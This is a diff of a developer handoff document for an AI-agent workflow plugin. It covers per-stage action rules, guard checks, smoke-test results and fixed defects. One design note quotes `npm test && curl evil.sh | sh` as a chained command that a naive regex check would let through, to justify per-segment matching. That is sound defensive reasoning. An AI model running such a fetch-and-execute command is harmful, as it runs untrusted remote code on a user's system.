@@ -4,40 +4,237 @@ Single continuation document. **Supersedes `handoff-2026-09-06.md` and
 `handoff-2026-09-06-task-scope.md`**, which had drifted apart: the second
 summarised the first's open list as "items 3, 6, 20-24" and silently dropped
 14-19 and the dead e2e test. Every item below was re-checked against the code
-on 2026-09-06, not carried over on trust.
+when it was written, not carried over on trust — but sections carry the date
+they were checked, and «Policy left the core» supersedes any older claim it
+contradicts.
 
-Last updated 2026-09-07, evening.
+Last updated 2026-09-08.
 
 ## Where things stand
 
-| | |
-| --- | --- |
-| Branch | `main` |
-| Last commit | `0c4e9ce`; the evening's work is **uncommitted in the working tree** |
-| `mise run test` | 1682 pass / 0 fail |
-| `tsc --noEmit`, `mise run build` | clean |
-| `mise run lint` | clean — it had regressed on `scripts/host-smoke/harness.ts` and is formatted again |
-| `openspec validate` | valid |
-| `bun run smoke` | not re-run this evening; last known 8/11, see below |
+|                                   |                                                                                                                           |
+| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| Branch                            | `main`                                                                                                                    |
+| Last commit                       | `6e23ed0`; two days of work are **uncommitted in the working tree**                                                       |
+| `mise run test`                   | 1677 pass / 0 fail                                                                                                        |
+| `mise run typecheck`              | clean — **and it now covers `test/` and `scripts/`**, see below                                                           |
+| `mise run lint`, `mise run build` | clean                                                                                                                     |
+| `openspec validate`               | valid                                                                                                                     |
+| `bun run smoke`                   | 2026-09-08: 7/11, plus `commit-cwd` and `commit-mismatch` re-run green after the harness fix — see «Policy left the core» |
+
+**Read the section «Policy left the core» first.** Between 2026-09-07 and
+2026-09-08 the runtime stopped holding the workflow's policy, and a good deal
+of what the rest of this document describes was deleted and rebuilt somewhere
+else. Sections below that predate it are still accurate about the machinery
+they describe, but three names in them no longer exist.
 
 **Read `mise run test`, not `npx vitest run`.** The suite is bun's. Under
 vitest, 156 tests fail for reasons that have nothing to do with the code, and
 at least one file (`test/app/mutation-orchestrator.test.ts`) imports `bun:test`
 and cannot be collected at all. A count taken with the wrong runner is noise.
 
+## Policy left the core — 2026-09-07 / 2026-09-08
+
+Three things the runtime decided by itself were deleted and rebuilt as
+declarations. The record made before the deletion, and used to rebuild from,
+is `docs/gate-actions-before-removal.md` — it describes what each one did, in
+what order, and what it stood between.
+
+### What went
+
+| Removed                                                                               | It used to                                                                                                                                                                                             |
+| ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `canCommit`                                                                           | refuse a commit unless every `requiredGates` passed and every task was completed                                                                                                                       |
+| the `invariants` gate                                                                 | carry the engine's verdict about a move, under a hardcoded gate id                                                                                                                                     |
+| `actionGuards`                                                                        | hold one expression for the whole graph — in practice `beginMutation: "session.approved('plan')"`                                                                                                      |
+| `requiredGates` and `kind: pass \| fail`                                              | the field existed only to feed `kind`, and `kind` was sugar over a guard nobody wrote by hand                                                                                                          |
+| `verifiers`, `terminalStages`, `stageLevelGuards`, `tools`, `settings`, `gateMapping` | nothing — six fields accepted by the schema and read by no one                                                                                                                                         |
+| `TERMINAL_STAGES`                                                                     | name a stage terminal by a hardcoded list of words (`done`, `completed`, `cancelled`, …) — computed into `terminalStages` and read by nobody; `done`/`failed` now say so themselves with `actions: []` |
+
+`requiredGates` defaulted to `['invariants']` in three places in the engine. It
+outlived the gate it named for a day, which made `kind: pass` permanently false
+and `kind: fail` permanently blocking for any profile that used them. Nothing
+shipped did, so it never fired — but that is the shape of every landmine in
+this repository: correct-looking, unreferenced, and armed.
+
+### What replaced it: `actions:` on a stage
+
+A stage now declares what may happen on it. This is the second axis beside
+transitions: an edge answers «may we leave», an action answers «may we do this
+while staying». A commit is not a transition, and neither is an edit.
+
+```yaml
+code:
+  actions:
+    - action: edit
+      paths: ['**']
+      guard: "session.approved('plan')"
+    - action: bash
+      commands: ['git status', 'git diff.*']
+      guard: "session.approved('plan')"
+```
+
+- The vocabulary is closed and names **host tools**: `bash` and `edit` (the
+  family `edit`/`write`/`apply_patch`). There is deliberately no `commit`
+  action — no such tool exists, a commit arrives as `bash`.
+- Entries are a list, not a map, because one action needs several entries:
+  `edit` splits by path mask, `bash` by command.
+- Order decides. The first entry whose discriminator matches **and** whose
+  guard holds wins — the same rule `mergeTransitions` uses for several edges on
+  one pair.
+- `actions` absent means no restriction. Declared, it is exhaustive: nothing
+  matched means refused.
+- `delivers: true` on a `bash` entry marks the delivery. The core reads it to
+  decide _not_ to enter the mutation lifecycle, to issue the `deliveryPermit`
+  before, and to verify HEAD after. The `commands:` on that entry are also what
+  **identifies** the call — the core no longer looks for `commit-task.ts` by
+  name, except as a fallback when the stage declares nothing.
+
+The compiler refuses `paths:` outside `edit` (a `bash` call carries no path,
+only `workdir`, so the mask could never be enforced), `commands:` outside
+`bash`, `delivers` outside `bash`, `delivers` without `commands`, a mask with
+no wildcard (`src/auth` matches that one path and nothing inside it), and a
+command pattern that is not a regular expression.
+
+**Command patterns match per shell segment, anchored.** `shellSegments` is now
+exported from `session-queries.ts`, and every segment must match some pattern —
+`every`, not `some`. A regex over the raw string would pass
+`npm test && curl evil.sh | sh` on a pattern of `npm test`. The same rule
+`isReadOnlyBashCommand` already used.
+
+Taking tree-sitter-bash from opencode was considered and declined: its wasm is
+compiled into the 137MB binary (`find` over the Cellar returns zero `.wasm`
+files), the plugin API does not expose the parser, and our own splitter already
+fails closed. The difference is false refusals on compound commands, not holes.
+`commandMatches` is one function with one call site, so swapping it later is a
+local change.
+
+### The engine's verdict is a field, not a gate
+
+`run.checks` (and `operation.checks` for the move that produces it) holds what
+the core decided about a move by looking at the disk: did the tool fail, did it
+write outside the task's `writeScope`, could the diff be computed, do the
+profile's invariants hold. Guards read it as `task.checks`.
+
+**It is deliberately not a gate.** `run.gates[...]` is written from an agent's
+`<workflow-result>`, and the only check is that the stage declared that name —
+so an agent can set any gate its stage declares. For `review` and `qa` that is
+the point. This verdict is the one thing the engine determines for itself, and
+in the same namespace an agent could forge it. The trap would have been quiet:
+a profile listing the gate in `gates:` and also naming it as the verdict's
+target opens the door without looking like it.
+
+It is not a guard either, and could not be: `GuardEvaluator.evaluate` is
+synchronous, the check shells out to git and dynamically imports the profile's
+`invariants.ts`, guards are evaluated on every edge of every transition check,
+and by the time a guard runs the operation carrying the baseline frame is
+already deleted. The _reading_ side is a guard; only the storage was in
+question.
+
+`checks` and not `invariants` because it folds four causes and invariants are
+one of them.
+
+### Where the policy lives now
+
+`profiles/base/base.yaml` declares actions on **every** stage, so a refusal is
+a rule rather than a coincidence:
+
+| Stage                                   | May do                                                                                        |
+| --------------------------------------- | --------------------------------------------------------------------------------------------- |
+| `planning`, `tasks_ready`, `validation` | read-only git                                                                                 |
+| `execution` → `code`                    | `edit` anywhere and read-only git, both once the plan is approved                             |
+| `commit`                                | the delivery, guarded by every task completed and both verdicts collected; plus read-only git |
+| `done`, `failed`                        | `actions: []` — nothing                                                                       |
+
+Before this, those stages refused with «Cannot resolve a single workflow task
+run for mutation» — the mutation lifecycle failing for a plumbing reason,
+which happened to look like protection. Verified by driving the real hooks
+against every stage.
+
+**Inheriting a stage replaces its `actions` wholesale.** A stage merges field
+by field, and `actions` is one field. `android` adds `./gradlew` and therefore
+repeats the `edit` entry — dropping it would remove the guard silently. There
+is a test asserting all three shipped profiles still carry it.
+
+The forbidden-`git commit` rule became a **default** rather than a law: it
+applies only when the acting stage declares no actions (or the profile cannot
+be read). A stage that declares actions answers for itself, and a profile that
+wants to deliver through plain `git commit` can now say so.
+
+### Host smoke, 2026-09-08 — what it caught that 1680 tests did not
+
+Run for the first time since the policy moved out of the core. Four failures,
+**one of them the plugin's**:
+
+|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |                             |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- |
+| **The first edit of a task was refused.** `beginMutation` opens the loop run _after_ the action is admitted, so the first edit of every task arrives with no run open — and `actingStageActions` judged it by the outer `execution` stage, which permits no edits. Closing the hole closed the work with it. The resolver now defers to the loop's first nested stage, which is where the run will open: the same rule `resolveMutationRun` follows. Admission and lifecycle disagreeing _was_ the bug. | `src/app/runtime.ts`        |
+| **The harness asserted the `invariants` gate**, deleted a day earlier. Moved to `run.checks`.                                                                                                                                                                                                                                                                                                                                                                                                           | `scripts/host-smoke/run.ts` |
+| **The harness committed without passing through `validation`.** It marks tasks completed directly, so no session-level `review`/`qa` is produced, `validation → commit` never fires, and the session never reaches the stage that declares the delivery. This used to work because `commitBefore` issued a permit _from any stage_ — the stage took no part. It does now, deliberately. Two verifier steps added.                                                                                       | `scripts/host-smoke/run.ts` |
+| `cicd-full-cycle` timed out (a harness error, not a refusal) and `verify-loop` failed on the model refusing to dispatch `reviewer` seven times. Reproduced the same loop locally against the real hooks: the task moves `code → verify` correctly.                                                                                                                                                                                                                                                      | —                           |
+
+**And reproducing that last one by hand found a defect the report never showed.**
+A delta profile inherits the _list_ of invariant ids through
+`profile.json.extends`, but `invariants.ts` was looked up only in the profile's
+own directory. `smoke` therefore threw `InvariantsUnavailableError` on every
+move, and the `catch` turned that into a failed verdict — every task move in
+every delta profile marked as failing its checks. It predates this work;
+restoring `run.checks` is what made it observable. The file is now resolved
+along the `extends` chain.
+
+The lesson worth keeping: unit tests construct state, smoke walks the cycle.
+Everything above is invisible to the first kind by construction.
+
+### Declaration order is the contract — by decision
+
+There is no `initial:` and no `entry:`. The first stage declared is where the
+workflow starts; the first stage inside a loop is where a task run opens _and_
+what the task's first edit is judged by. The operator chose to keep the order
+rather than name it.
+
+That makes reordering two YAML blocks a behavioural change that looks like
+formatting, so it is pinned: `test/schema/declaration-order.test.ts` asserts all
+three consequences against the shipped `base`, and reordering either
+`planning`/`tasks_ready` or `code`/`verify` fails the build. Documented for
+profile authors in `profiles/README.md` and `docs/schema-reference.md`.
+
+### The typecheck covers tests now
+
+`tsconfig.json` includes `test/**` and `scripts/**`; `rootDir` is gone (it
+conflicted and was never needed under `noEmit`). This cost 153 accumulated
+errors, all fixed. It was worth it three times over: the same gap had hidden
+`kind: 'auto'`, `requiredGates:` and `action: 'commit'` in test literals after
+each of those was deleted — the tests stayed green while asserting nothing.
+
+What it caught that was not cosmetic: `scripts/tmr-workflow-create.ts` (deleted
+— it called `engine.derivePhase` and `mergeSchemasToEngineConfig`, neither of
+which exists, and nothing referenced it), two live imports of the deleted
+`canCommit`, `baselineHashes` in the fixtures of eight test files, and a name
+collision between two exported `AdmissionResult` types.
+
+Two helpers were added rather than scattering casts: `test/support/tool-result.ts`
+narrows `ToolResult` (it is `string | { output }`) and **throws** on the string
+branch instead of asserting; `test/support/host-payload.ts` is a narrow, named
+cast used only at the boundary with `@opencode-ai/plugin` types. Our own types
+must not pass through it.
+
+Still open: `strictNullChecks` is `false`, so discriminated unions do not
+narrow. Two places cast explicitly because of it, and `AdmissionResult` in
+`action-admission.ts` was written flat for the same reason.
+
 ### Host smoke, 2026-09-06
 
 Every scenario except `cicd-full-cycle`, which the operator asked to skip while
 its profile is in progress. Report at `docs/host-smoke.md`.
 
-| Scenario | |
-| --- | --- |
-| plugin-loads, no-session, create, git-block, commit-gate, plan-consent | PASS, 1 attempt |
-| task-control | PASS, 2 attempts |
-| verify-loop | PASS, 6 attempts — a prompt problem, not a finding, but six is worth looking at |
-| commit-mismatch | was ERROR `spawnSync is not defined` — **fixed** (`scripts/host-smoke/run.ts` used it at line 908 and never imported it); PASSes on re-run, 6 attempts |
-| comprehensive-full-cycle | FAIL — a real defect, item 0 below |
-| commit-cwd | FAIL, reproduced twice, cause not established — see below |
+| Scenario                                                               |                                                                                                                                                        |
+| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| plugin-loads, no-session, create, git-block, commit-gate, plan-consent | PASS, 1 attempt                                                                                                                                        |
+| task-control                                                           | PASS, 2 attempts                                                                                                                                       |
+| verify-loop                                                            | PASS, 6 attempts — a prompt problem, not a finding, but six is worth looking at                                                                        |
+| commit-mismatch                                                        | was ERROR `spawnSync is not defined` — **fixed** (`scripts/host-smoke/run.ts` used it at line 908 and never imported it); PASSes on re-run, 6 attempts |
+| comprehensive-full-cycle                                               | FAIL — a real defect, item 0 below                                                                                                                     |
+| commit-cwd                                                             | FAIL, reproduced twice, cause not established — see below                                                                                              |
 
 **`commit-cwd` — what is known.** It fails with `commit-task: nothing
 staged to commit`, on every attempt, in two separate runs. `commit-task.ts`
@@ -92,7 +289,7 @@ operator's decision.
 1. **`checkTransition` fail-open** (`184ca0c`). An edge carrying a guard,
    consent or a kind is refused without a session; an unconditional edge is
    still allowed, because that answer is about the shape of the graph. Three
-   tests asserted the bypass *by name* and now assert the refusal.
+   tests asserted the bypass _by name_ and now assert the refusal.
 2. **Parent/child linkage** (`28ba4ff`). `SessionQueue` takes a parent
    resolver, walks the host's chain through `client.session.get` and memoises
    every node to its root; hook-driven reads go through `loadGoverning`.
@@ -107,8 +304,8 @@ operator's decision.
 
 1. **Commit blocked after the tasks finish** (`a11e254`). The commit is
    delivery, not an edit inside a loop: `mutationBefore`/`mutationAfter` skip
-   it. It has its own lifecycle. *The memory of this being fixed earlier was
-   wrong — it was still live.*
+   it. It has its own lifecycle. _The memory of this being fixed earlier was
+   wrong — it was still live._
 2. **`bumpRetry: cycles`** (`37a615c`). A workflow has two budgets. The session
    schema accepts a workflow-level budget name beside a task id, and the
    compiler refuses the mirror mistake (`task.id` at workflow level).
@@ -131,7 +328,9 @@ operator's decision.
 `7f0389c` and `fdd04f8`.
 
 - **Guard syntax is parsed at compile time** — every transition guard at both
-  levels, entry and exit guards, `actionGuards`, stage-assignment conditions.
+  levels, entry and exit guards, stage-assignment conditions, and — since
+  `actions:` arrived — every action entry's guard. (`actionGuards` itself is
+  gone; see «Policy left the core».)
   `session.gates.(((` used to compile clean and read `false` for ever.
 - **Unknown keys are reported as compile errors**, with a path and the allowed
   names. `ProfileSchemaSchema` stays `.passthrough()`; the complaint moved to
@@ -156,17 +355,17 @@ touched, and each fix has a test that fails without it.
 
 ### Confirmed and fixed
 
-| | |
-| --- | --- |
-| **A parent blocked its own child.** `serial` admission counted every open run in the session, so a running parent in `parents` refused its child in `task-1` with «Serial task cycle admits only the next unfinished task» — and then waited for a child that could not start. `taskAdmissionRejection` now splits two scopes: `cycleRuns` (same `listKey`) drives `serial`, `maxConcurrent` and the `serial_with_overlap` order checks; session-wide `activeRuns` still drives `writeScope` overlap, because the diff is split by path, not by list. | `src/app/runtime.ts` |
-| **A circular `extends` chain resolved half-assembled.** `break` kept the walk finite and told nobody. It throws now, naming the cycle. The missing-parent branch two lines below had always thrown — same authoring mistake, same answer. | `src/app/profile-resolver.ts` |
-| **A deleted session came back.** `WorkflowStore.delete()` took neither the in-process chain nor the file lock, so a `save()` already holding its payload renamed the file back afterwards. 20/20 before, 0/20 after. | `src/session/session-store.ts` |
-| **One stray file hid every session.** `list()` threw `URIError` out of the loop on an undecodable name. | `src/session/session-store.ts` |
-| **The dashboard was doubly stale.** It stripped `.json` by first match (`a.jsonb.json` → session `ab.json`), decoded outside its own `try`, and its live update had never worked: the client keyed on `data.rootSessionID` and a `data.event` wrapper, neither of which the server has ever sent. | `src/dashboard/*` |
-| **`onFailure: retry` did nothing.** Implemented as what it always meant — the edge closes on `isExhausted(from)`, and taking it spends an attempt against the stage's own `retryBudget`. `terminal` needed no code: once the retry edge closes, the next open edge out of the stage is the terminal one. | `src/domain/engine.ts` |
-| **An invariant failure spent a retry attempt.** Recording a verdict is not retrying. The runtime already spends one on the move that retries (`spendOnFailure`, `recordTaskRetryFailure`), so this was a second, independent source — a task could exhaust its retries without a single retry having been taken. | `src/domain/operation-lifecycle.ts` |
-| **A stage typo was invisible.** `validateKnownKeys` in the compiler already refuses unknown keys with a good message, but zod stripped stage keys before it could see them: `allowedAgent` for `allowedAgents` gave a stage with no agent restriction, silently. `StageDefSchema` is `.passthrough()` now, like the root. | `src/schema/profile-schema.ts` |
-| **`verifiers` deleted.** Carried by loader, resolver and the compiler's key list; read by nothing. Removed from the schema, the type, three shipped profiles, three smoke profiles, two fixtures and the README. | everywhere |
+|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |                                     |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
+| **A parent blocked its own child.** `serial` admission counted every open run in the session, so a running parent in `parents` refused its child in `task-1` with «Serial task cycle admits only the next unfinished task» — and then waited for a child that could not start. `taskAdmissionRejection` now splits two scopes: `cycleRuns` (same `listKey`) drives `serial`, `maxConcurrent` and the `serial_with_overlap` order checks; session-wide `activeRuns` still drives `writeScope` overlap, because the diff is split by path, not by list. | `src/app/runtime.ts`                |
+| **A circular `extends` chain resolved half-assembled.** `break` kept the walk finite and told nobody. It throws now, naming the cycle. The missing-parent branch two lines below had always thrown — same authoring mistake, same answer.                                                                                                                                                                                                                                                                                                             | `src/app/profile-resolver.ts`       |
+| **A deleted session came back.** `WorkflowStore.delete()` took neither the in-process chain nor the file lock, so a `save()` already holding its payload renamed the file back afterwards. 20/20 before, 0/20 after.                                                                                                                                                                                                                                                                                                                                  | `src/session/session-store.ts`      |
+| **One stray file hid every session.** `list()` threw `URIError` out of the loop on an undecodable name.                                                                                                                                                                                                                                                                                                                                                                                                                                               | `src/session/session-store.ts`      |
+| **The dashboard was doubly stale.** It stripped `.json` by first match (`a.jsonb.json` → session `ab.json`), decoded outside its own `try`, and its live update had never worked: the client keyed on `data.rootSessionID` and a `data.event` wrapper, neither of which the server has ever sent.                                                                                                                                                                                                                                                     | `src/dashboard/*`                   |
+| **`onFailure: retry` did nothing.** Implemented as what it always meant — the edge closes on `isExhausted(from)`, and taking it spends an attempt against the stage's own `retryBudget`. `terminal` needed no code: once the retry edge closes, the next open edge out of the stage is the terminal one.                                                                                                                                                                                                                                              | `src/domain/engine.ts`              |
+| **An invariant failure spent a retry attempt.** Recording a verdict is not retrying. The runtime already spends one on the move that retries (`spendOnFailure`, `recordTaskRetryFailure`), so this was a second, independent source — a task could exhaust its retries without a single retry having been taken.                                                                                                                                                                                                                                      | `src/domain/operation-lifecycle.ts` |
+| **A stage typo was invisible.** `validateKnownKeys` in the compiler already refuses unknown keys with a good message, but zod stripped stage keys before it could see them: `allowedAgent` for `allowedAgents` gave a stage with no agent restriction, silently. `StageDefSchema` is `.passthrough()` now, like the root.                                                                                                                                                                                                                             | `src/schema/profile-schema.ts`      |
+| **`verifiers` deleted.** Carried by loader, resolver and the compiler's key list; read by nothing. Removed from the schema, the type, three shipped profiles, three smoke profiles, two fixtures and the README.                                                                                                                                                                                                                                                                                                                                      | everywhere                          |
 
 ### Reported, reproduced, and not defects at the severity claimed
 
@@ -200,7 +399,7 @@ mentioned the wrong word; they are 17 behavioural tests driving real
 `Request`/`Response` objects.
 
 **`/api/agents/:id/prompt` answers.** It read `<repo>/agent/<agent>.md`, a flat
-directory this project does not have — the layout of the *previous* project,
+directory this project does not have — the layout of the _previous_ project,
 where `../harness/agent/` still exists. The sync writes
 `<harness>/agents/<profileId>/<agent>.md`, so the endpoint now takes the
 profile from the newest session, and `/api/agents/:profileId/:agentId/prompt`
@@ -216,7 +415,7 @@ Proxyman, Mobile MCP, `ast-index`, detekt or `TMR-` keys — keeping what belong
 to the harness itself: stage names matching `base.yaml`, session facts, the
 consent-request block, the `<workflow-result>` marker, visibility restrictions,
 the delegation rule and the git-safety classification. Stack specifics are
-*requested* from the profile rather than described.
+_requested_ from the profile rather than described.
 
 The agent roster rule changed with them: a declared `agents` list in
 `profile.json` is the source of truth, and when a profile declares none the
@@ -230,28 +429,20 @@ lost every agent its parent shipped.
 
 ### Waiting on the operator, raised 2026-09-07 evening
 
-1. **What `failed` should mean — and `done` with it.** Neither is enforced.
-   `terminalStages` is computed in `src/schema/compile-workflow.ts:466` from a
-   hardcoded `TERMINAL_STAGES` set and **read by nobody**, so a stage is
-   terminal only in the sense that no edge leaves it. Reproduced on a live
-   runtime: a session in `done` still admits dispatch. Between «finished»,
-   «failed» and «stuck» there is no behavioural difference at all — the
-   workflow stops moving, the session does not stop working.
+1. **What `failed` should mean — and `done` with it.** ~~Neither is
+   enforced~~ — **half closed**. `terminalStages` and its hardcoded
+   `TERMINAL_STAGES` are gone, and `base` now declares `actions: []` on both
+   stages, so nothing can be _done_ there: a probe against the live runtime
+   refuses an edit, a bash call and a commit on either. What is still not
+   answered is the other half — `failed` carries no reason. Why the workflow
+   stopped is nowhere in the session, so «finished», «failed» and «stuck» still
+   read alike to anyone looking at the file. Option 4 of the four once put to
+   the operator: require the entry to record which gate failed or which budget
+   ran out.
 
-   Four options were put to the operator: (1) leave it and delete the unread
-   `terminalStages`; (2) make terminality observable — the dashboard and TUI
-   stop showing the session active; (3) make it binding — a terminal stage
-   refuses dispatch, mutation and commit, and an edge out of one becomes a
-   compile error; (4) give `failed` content — require the entry to record which
-   gate failed or which budget ran out, so «why did we stop» is readable from
-   the session. **Recommended: 3**, because 2 alone would honestly report
-   «finished» while work continues in that same session. Undecided.
-
-2. **`settings` is read by nothing.** Carried by the resolver
-   (`src/app/profile-resolver.ts:285`) and that is all — declaring a setting
-   changes no behaviour. The fourth such key found this evening, after
-   `onFailure` (implemented), `verifiers` (deleted) and `terminalStages`
-   (item 1). Asked whether to delete it; unanswered.
+2. ~~**`settings` is read by nothing.**~~ **Closed** — deleted, together with
+   `tools` and `gateMapping`, both equally unread. That is six such fields
+   removed in total; see the table under «Policy left the core».
 
 3. **A cross-process lock for `MatchedRulesStateStore`.** Offered, not done.
    Two instances over one state directory lose a merge every time. It does not
@@ -260,8 +451,21 @@ lost every agent its parent shipped.
    `WorkflowStore` is the pattern, and it is private — extracting it touches
    the session store, which is why this was not done unasked.
 
-4. **`parseRuntimeState` carries unreachable tolerance.** It accepts `gates`
-   as an array *or* an object, `tasks` as either, and a missing `sessionId`
+4. **`strictNullChecks` is off.** `tsconfig.json` sets it `false`, and the
+   consequence is not cosmetic: TypeScript will not narrow a discriminated
+   union, so `if (!result.ok)` does not make `result.error` reachable. Three
+   places work around it — two casts in tests and one type in
+   `action-admission.ts` written flat rather than as a union. Turning it on is
+   its own change and probably a large one; the workarounds name the reason
+   where they sit.
+
+5. **The dashboard and TUI have no notion of a terminal session.** Related to
+   item 1: `done` and `failed` now refuse every action, but nothing tells a
+   reader the session is finished. That was option 2 of the four, and it is
+   still worth doing beside option 4.
+
+6. **`parseRuntimeState` carries unreachable tolerance.** It accepts `gates`
+   as an array _or_ an object, `tasks` as either, and a missing `sessionId`
    standing in as `rootSessionID` (`src/tui/tui.ts:158-260`). The TUI reads
    schema-validated sessions now, so those branches cannot be entered. Left in
    place deliberately: clearing them is its own change, not a rider on this
@@ -271,14 +475,14 @@ lost every agent its parent shipped.
 
 The morning handoff listed 14-19 as open. Re-checked:
 
-| | Claim | Now |
-| --- | --- | --- |
-| 14 | `compileWorkflow` never called from `src` | **closed** — `src/app/mutation-orchestrator.ts:263` |
-| 15 | `exitGuards` unread, `stageLevelGuards` unpopulated | **half** — the array form is read (`src/domain/task-movement.ts:76`); `stageLevelGuards` is still never populated, `schemaToEngineConfig` does not return it |
-| 16 | `onFailure` has no consumer | **closed** — `retry` implemented, `terminal` needs nothing; see below |
-| 17 | no profile uses `kind: pass\|fail` | **open** — it appears only in `profiles/android/task-cycles.yaml`, which declares itself unregistered |
-| 18 | `deriveStageFn` falls back to `'PLANNING'` | **open** — see the stage-name audit below |
-| 19 | `editingAgents` / `verifiers` are declarative only | **closed** — schema-level `editingAgents` is read by `engine.getEditingAgents()` (`src/app/runtime.ts:967`) to classify whether a stage edits; `verifiers` was read by nothing and has been deleted |
+|     | Claim                                                                                   | Now                                                                                                                                                                                                 |
+| --- | --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 14  | `compileWorkflow` never called from `src`                                               | **closed** — `src/app/mutation-orchestrator.ts:263`                                                                                                                                                 |
+| 15  | `exitGuards` unread, `stageLevelGuards` unpopulated                                     | **half** — the array form is read (`src/domain/task-movement.ts:76`); `stageLevelGuards` is still never populated, `schemaToEngineConfig` does not return it                                        |
+| 16  | `onFailure` has no consumer                                                             | **closed** — `retry` implemented, `terminal` needs nothing; see below                                                                                                                               |
+| 17  | no profile uses `kind: pass\|fail`                                                      | **open** — it appears only in `profiles/android/task-cycles.yaml`, which declares itself unregistered                                                                                               |
+| 18  | `deriveStageFn` falls back to `'PLANNING'`                                              | **open** — see the stage-name audit below                                                                                                                                                           |
+| 19  | `editingAgents` / `verifiers` are declarative only (`verifiers` has since been deleted) | **closed** — schema-level `editingAgents` is read by `engine.getEditingAgents()` (`src/app/runtime.ts:967`) to classify whether a stage edits; `verifiers` was read by nothing and has been deleted |
 
 ### Testing
 
@@ -326,8 +530,10 @@ The morning handoff listed 14-19 as open. Re-checked:
   Deferred to release: migrations are ignored during active development.
 - **The plan that moves commit into the schema is frozen**
   (`docs/plans/task-11-12-commit-as-ordinary-step.md`). Too raw. The old commit
-  lifecycle — `canCommit`, `deliveryPermit` / `deliveryReceipt` — stays. Do not
-  implement it.
+  lifecycle stays as evidence-gathering: `deliveryPermit` /
+  `deliveryReceipt` and the `git diff-tree` comparison are still the core's.
+  `canCommit` is **gone** — the condition it computed is now the delivering
+  entry's own `guard:` in `base.yaml`. Do not implement the frozen plan.
 - **Dispatching an agent on any stage** — investigated 2026-09-06, decision
   postponed, code untouched. See the section below.
 - **The attempt ledger** for `task-scope-and-per-move-invariants`: the attempt
@@ -447,19 +653,19 @@ highest priority first, and the persisted `currentStage` is only the fallback
 when no rule matches or none is declared. A schema that declares
 `stageAssignments` has handed the stage decision to an expression.
 
-**A gate's `failed` is born before any budget is consulted.** Two places, and
-they are not symmetric: `finishMutation(passed = false)`
-(`src/domain/operation-lifecycle.ts`) sets the `invariants` gate, and
-`src/app/runtime.ts:2077` records an agent's `<workflow-result>` verdict on the
-gate it names. The budget is spent later, by the move that retries — that
-asymmetry is why the bump was removed from `finishMutation` this evening.
+**A verdict is born before any budget is consulted, and the two writers are
+not symmetric.** `finishMutation(passed = false)`
+(`src/domain/operation-lifecycle.ts`) writes `run.checks` — the engine's own
+verdict about the move. An agent's `<workflow-result>` writes the gate it names,
+in `runtime.ts`. Different fields on purpose: an agent can set any gate its
+stage declares, and the engine's verdict must not live where that is possible.
+The budget is spent later either way, by the move that retries — that asymmetry
+is why the bump was removed from `finishMutation`.
 
 **The state directory is global and keyed by session id alone.**
 `~/.opencode/state/opencode-rules` for matched rules, and `sessionsDir` for
 sessions. Two runtimes for different projects cannot collide because a session
 belongs to one project — but nothing about the path says so.
-
-
 
 **Hook ordering is load-bearing.** `handleWorkflowResult` (the `runtime.ts`
 after-chain, step 1b) computes movement and deletes the operation. Anything
@@ -590,11 +796,11 @@ a schema that had moved on, and the tests fed every one of them the old shape,
 so all of it was green while none of it worked. Proven before and after on a
 real `createSession` session with one running operation:
 
-| | Was | Now |
-| --- | --- | --- |
-| `stage` | `execution` | `execution` — always correct, it reads `currentStage` |
-| `prevStage` / `nextStage` | `null` / `planning` | `tasks_ready` / `validation` |
-| open calls | none shown | the operation, its task and its agent |
+|                           | Was                 | Now                                                   |
+| ------------------------- | ------------------- | ----------------------------------------------------- |
+| `stage`                   | `execution`         | `execution` — always correct, it reads `currentStage` |
+| `prevStage` / `nextStage` | `null` / `planning` | `tasks_ready` / `validation`                          |
+| open calls                | none shown          | the operation, its task and its agent                 |
 
 **`STAGES` was the pre-stage-model chain** — `planning, tasks_ready, code,
 review, qa, commit, done, failed`. `code` became a nested stage of the
@@ -670,16 +876,16 @@ Measured 2026-09-06, by loading one file per kind of breakage. This matters
 because a fixture corpus of deliberately-invalid profiles is only possible for
 the kinds that fail as data.
 
-| Breakage | What happens |
-| --- | --- |
-| Broken YAML syntax | **throws** `YAMLParseError` |
-| Wrong type for a field (`loop: 42`) | **throws** `ZodError` at `ProfileSchemaSchema.parse` |
-| An unknown key (`phases:`) | ~~silently ignored~~ — **fixed** (`7f0389c`): reported as a compile error |
-| A gate the profile does not declare, a transition to a stage that does not exist | loads, reported as compile errors |
-| A guard expression that cannot parse | ~~loads, no compile error~~ — **fixed** (`7f0389c`): reported as a compile error |
-| No such file | `loadSchemaFromPath` returns `null` |
+| Breakage                                                                         | What happens                                                                     |
+| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
+| Broken YAML syntax                                                               | **throws** `YAMLParseError`                                                      |
+| Wrong type for a field (`loop: 42`)                                              | **throws** `ZodError` at `ProfileSchemaSchema.parse`                             |
+| An unknown key (`phases:`)                                                       | ~~silently ignored~~ — **fixed** (`7f0389c`): reported as a compile error        |
+| A gate the profile does not declare, a transition to a stage that does not exist | loads, reported as compile errors                                                |
+| A guard expression that cannot parse                                             | ~~loads, no compile error~~ — **fixed** (`7f0389c`): reported as a compile error |
+| No such file                                                                     | `loadSchemaFromPath` returns `null`                                              |
 
-Only the first two throw, so invalid fixtures must be broken *semantically* —
+Only the first two throw, so invalid fixtures must be broken _semantically_ —
 `compileWorkflow`'s own errors — and not by shape.
 
 **The table is about loading a file. In production the semantic row is fatal
@@ -689,11 +895,11 @@ so a gate nobody declares freezes the session with a readable reason, exactly
 like a bad type does. Nothing crashes in any of the six rows — measured by
 driving the real hooks against a profile with `loop: 42`:
 
-| Entry point | What the caller sees |
-| --- | --- |
-| `tool.execute.before` (`bash`, `task`) | caught, converted to `WorkflowBlockedError` with the reason |
-| `tool.execute.after` (`task`) | returns cleanly; its own catch at `runtime.ts:1794` logs a warning |
